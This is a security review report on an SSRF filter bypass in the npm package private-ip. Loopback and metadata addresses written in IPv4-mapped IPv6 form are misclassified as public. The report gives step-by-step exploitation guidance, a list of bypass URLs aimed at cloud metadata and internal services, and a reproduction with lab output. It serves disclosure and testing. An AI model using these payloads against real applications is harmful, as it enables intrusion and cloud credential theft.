# private-ip — Security Review Findings

**Package:** [private-ip](https://www.npmjs.com/package/private-ip) | **Files reviewed:** 1

## Summary

| ID | Vulnerability Class | Severity | Breachable | Location |
|----|---------------------|----------|------------|----------|
| PI-01 | SSRF Filter Bypass via IPv6 | HIGH | Yes | `ipv6_check` (lines 40-54) / exported default function (line 61) |

---

## PI-01: SSRF Filter Bypass via IPv6

- **Vulnerability class:** SSRF Filter Bypass
- **Raw severity:** HIGH
- **Adjusted severity (after reachability):** HIGH
- **Location:** `ipv6_check` (lines 40-54) / exported default function (line 61)
- **CVE:** CVE-2025-8020 (unpatched)

### Reachability Analysis

Any caller passing a user-controlled IPv6 string to `private-ip` — including SSRF-protection middleware that relies on this package to determine whether an IP is private — will receive an incorrect result. The IPv6 check fails to identify certain private/loopback IPv6 representations, allowing an attacker to bypass SSRF protections by encoding internal addresses in IPv6 formats that the regex does not match.

### Gate Status

**No gate** — exploitable in default configuration with no additional conditions required.

**Breach:** True

---

---

## Real-World Exploitation

### Where this library is used
private-ip has 200K+ weekly downloads and is primarily used as an SSRF protection filter. Applications call `privateIp(ip)` to check whether an IP is internal before making outbound requests.

### How an attacker would exploit it
1. **Identify the target**: find an application that fetches user-supplied URLs and uses private-ip to block internal addresses. Common patterns: URL preview/unfurl features, webhook deliveries, image proxy endpoints, RSS feed fetchers.
2. **Craft the bypass URL**: instead of `http://127.0.0.1/admin`, use `http://[::ffff:7f00:1]/admin`. This is the same loopback address in hex-form IPv4-mapped IPv6 notation. private-ip returns `false` (not private), so the SSRF filter allows the request through.
3. **Hit internal services**: target cloud metadata endpoints (`http://[::ffff:a9fe:a9fe]/latest/meta-data/` = 169.254.169.254), internal admin panels, databases listening on localhost, or other services behind the SSRF filter.

### Bypass payloads
```
http://[::ffff:7f00:1]/           → 127.0.0.1 (loopback)
http://[::ffff:7f00:1]:8080/      → 127.0.0.1:8080
http://[::ffff:a9fe:a9fe]/        → 169.254.169.254 (cloud metadata)
http://[::ffff:ac10:fe01]/        → 172.16.254.1 (internal network)
http://[::ffff:c0a8:0101]/        → 192.168.1.1 (internal network)
```

### Impact
- **Cloud credential theft**: read IAM credentials from metadata endpoints (AWS, GCP, Azure)
- **Internal service access**: reach admin panels, databases, caches on the internal network
- **Full SSRF**: pivot from external access to internal network scanning and exploitation

## Clean / Rejected

| Finding | Reason for Rejection |
|---------|---------------------|
| Insecure design — undefined return value (MEDIUM) | The function returns a falsy value (undefined) for unrecognized input, which callers may treat as "not private." This is a structural design issue but is not separately exploitable beyond what PI-01 already covers. |

---

---

## Reproduction (validated 2026-06-19)

**Lab reference:** `targets/labs/npm-private-ip/`

**Pinned version:** private-ip 3.0.2

### Steps

1. **Install the package:**
   ```bash
   npm install private-ip@3.0.2
   ```

2. **Run the IPv6 bypass test:**
   ```bash
   node -e "
   const p = require('private-ip');
   console.log('::ffff:7f00:1 =>', p('::ffff:7f00:1'));  // expected: true, got: false
   console.log('::2 =>', p('::2'));                        // expected: true, got: false
   "
   ```

3. **Verify** that private/loopback IPs are misclassified as public (SSRF bypass).

### Observed output (from `targets/labs/npm-private-ip/results.txt`)

```
private-ip PoC -- version: 3.0.2

ip                                      got     expected  verdict
------------------------------------------------------------------------
::ffff:7f00:1                           false   true      BYPASS
::2                                     false   true      BYPASS

=== RESULT: 2 bypass(es) -- private IP treated as public ===
```

### Verdict

**CONFIRMED.** Two IPv6 representations bypass the filter: `::ffff:7f00:1` (hex-form IPv4-mapped loopback) and `::2` (deprecated unicast). SSRF protections relying on this package can be bypassed.

---

---

## Download PoC Files

- [poc.mjs](poc/poc.mjs) — Battery of IPv6 bypass tests against private-ip filter
- [Dockerfile](poc/Dockerfile) — Isolated Docker environment with pinned private-ip@3.0.2

**Pipeline:** 2 raw findings → 1 confirmed (1 HIGH breachable)
